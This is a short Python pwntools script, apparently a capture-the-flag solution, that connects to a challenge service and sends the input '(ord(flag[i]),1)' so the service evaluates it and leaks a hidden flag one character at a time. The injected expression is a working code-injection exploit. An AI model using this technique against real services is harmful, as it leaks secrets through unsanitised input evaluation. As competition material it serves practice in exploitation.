import pwn


#conn = pwn.remote("pwn.dctf.si", 1337)
conn = pwn.remote("localhost", 1337)

text = ""
flag = ""
i = 0

for _ in range(100):

    while "Input coordinates" not in text:
        text = conn.recvline().decode()

    conn.sendline(f"(ord(flag[{i}]),1)".encode())
    text = conn.recvline().decode()

    if "Your input:" in text:
        charcode = int(text.split(':')[-1])
        flag += chr(charcode)
        i += 1

        if flag[-1] == '}':
            print("flag:", flag)
            break
